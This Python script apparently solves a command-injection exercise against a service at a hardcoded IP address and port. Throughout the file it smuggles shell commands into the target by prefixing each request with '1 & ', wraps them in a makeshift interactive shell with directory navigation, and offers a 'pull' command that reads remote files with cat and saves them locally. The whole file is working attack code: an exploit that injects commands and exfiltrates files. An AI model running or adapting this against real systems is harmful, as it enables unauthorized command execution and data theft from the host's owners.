import socket
import re

host = "157.230.179.99"
port = 1337

def shell():

    menu_cmd = ""
    
    
    #Will run until the user types in "quit"
    while menu_cmd != "quit":
        path = "/"
        shell_cmd = ""
        menu_cmd = input(">")

        #Prints the commands that can be used in the menu of the script
        if menu_cmd == "help":
            print("shell Drop into an interactive shell and allow users to gracefully exit")
            print("pull <remote-path> <local-path> Download files")
            print("help Shows this help menu")
            print("quit Quit the shell")
        elif menu_cmd[0:4] == "pull":
            file_split = menu_cmd.split()
            remote_path = file_split[1]
            local_path = file_split[2]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.recv(1024)
            pull_cmd = "1 & cat " + remote_path + '\n'
            s.send(pull_cmd.encode())
            file_txt = s.recv(1024).decode()
            output_file = open(local_path, "w")
            output_file.write(file_txt)


        
        elif menu_cmd == "shell":
            while "exit" not in shell_cmd:
                
                shell_cmd = input(path+">")
                
                if shell_cmd == "cd":
                    print("invalid")

                elif "&" in shell_cmd:
                    mult_shell_cmd = shell_cmd.split(" & ")
                    for curr_cmd in mult_shell_cmd:
                        if "cd" in curr_cmd:
                            temp_path = path
                            new_path = curr_cmd.split("cd ", 1)[1]
                            new_path = new_path.split(' ', 2)
                            if "/" in new_path[0]:
                                new_path[0] = new_path[0].split("/")
                                valid_path = True
                                
                                for dirs in new_path[0]:
                                    if dirs == "..":
                                        temp_path = re.sub(r'[a-zA-Z]+$',"" ,path)
                                    
                                    if dirs and ".." not in dirs:
                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        s.connect((host, port))
                                        s.recv(1024)
                                        dir_check = "1 & ls "+ temp_path +"\n"
                                        s.send(dir_check.encode())
                                        curr_dirs = s.recv(1024).decode()
                                        if dirs not in curr_dirs:
                                            valid_path = False
                                        else:
                                            if re.search(r'[a-zA-Z]+$',temp_path):
                                                temp_path = temp_path +"/"+dirs
                                            else:
                                                temp_path = temp_path + dirs
                                if not valid_path:
                                    temp_path = path
                                else:
                                    path = temp_path
                                    temp_path = path
                            elif ".." == new_path[0]:
                                if re.search(r'/[a-zA-Z]+$',path[1:]):
                                    path = re.sub(r'/[a-zA-Z]+$',"",path)
                                else:
                                    path = re.sub(r'[a-zA-Z]+$',"",path)
                            
                            else:
                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s.connect((host, port))
                                s.recv(1024)
                                dir_check = "1 & ls "+ path +"\n"
                                s.send(dir_check.encode())
                                curr_dirs = s.recv(1024).decode()
                                if new_path[0] not in curr_dirs:
                                    print("Invalid directory")
                                else:
                                    if re.search(r'[a-zA-Z]+$',path):
                                        path = path + "/" + new_path[0]
                                    else:
                                        path = path + new_path[0]
                        
                        elif "ls" == curr_cmd:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((host, port))
                            s.recv(1024)
                            ls_cmd = "1 & ls " + path +"\n"
                            s.send(ls_cmd.encode())
                            curr_dirs = s.recv(1024).decode()
                            print(curr_dirs)

                        else:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((host, port))
                            s.recv(1024)
                            test = curr_cmd.split()
                            s.send(("1 & " + test[0] + " " + path + "/" + test[1] +"\n").encode())
                            print(s.recv(1024).decode())
                else:
                    if "cd" in shell_cmd:
                            temp_path = path
                            new_path = shell_cmd.split("cd ", 1)[1]
                            new_path = new_path.split(' ', 2)
                            if "/" in new_path[0]:
                                new_path[0] = new_path[0].split("/")
                                valid_path = True
                                
                                for dirs in new_path[0]:
                                    if dirs == "..":
                                        temp_path = re.sub(r'[a-zA-Z]+$',"" ,path)
                                    
                                    if dirs and ".." not in dirs:
                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        s.connect((host, port))
                                        s.recv(1024)
                                        dir_check = "1 & ls "+ temp_path +"\n"
                                        s.send(dir_check.encode())
                                        curr_dirs = s.recv(1024).decode()
                                        if dirs not in curr_dirs:
                                            valid_path = False
                                        else:
                                            if re.search(r'[a-zA-Z]+$',temp_path):
                                                temp_path = temp_path +"/"+dirs
                                            else:
                                                temp_path = temp_path + dirs
                                            
                                if not valid_path:
                                    temp_path = path
                                else:
                                    path = temp_path
                                    temp_path = path
                            elif ".." == new_path[0]:
                                if re.search(r'/[a-zA-Z]+$',path[1:]):
                                    path = re.sub(r'/[a-zA-Z]+$',"",path)
                                else:
                                    path = re.sub(r'[a-zA-Z]+$',"",path)
                            
                            
                            else:
                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s.connect((host, port))
                                s.recv(1024)
                                dir_check = "1 & ls "+ path +"\n"
                                s.send(dir_check.encode())
                                curr_dirs = s.recv(1024).decode()
                                if new_path[0] not in curr_dirs:
                                    print("Invalid directory")
                                else:
                                    if re.search(r'[a-zA-Z]+$',path):
                                        path = path + "/" + new_path[0]
                                    else:
                                        path = path + new_path[0]
                        
                    elif "ls" == shell_cmd:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
                        s.recv(1024)
                        ls_cmd = "1 & ls " + path +"\n"
                        s.send(ls_cmd.encode())
                        curr_dirs = s.recv(1024).decode()
                        print(curr_dirs) 
                    else:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
                        s.recv(1024)
                        test = shell_cmd.split()
                        s.send(("1 & " + test[0] + " " + path + "/" + test[1] +"\n").encode())
                        print(s.recv(1024).decode())
            

            
shell()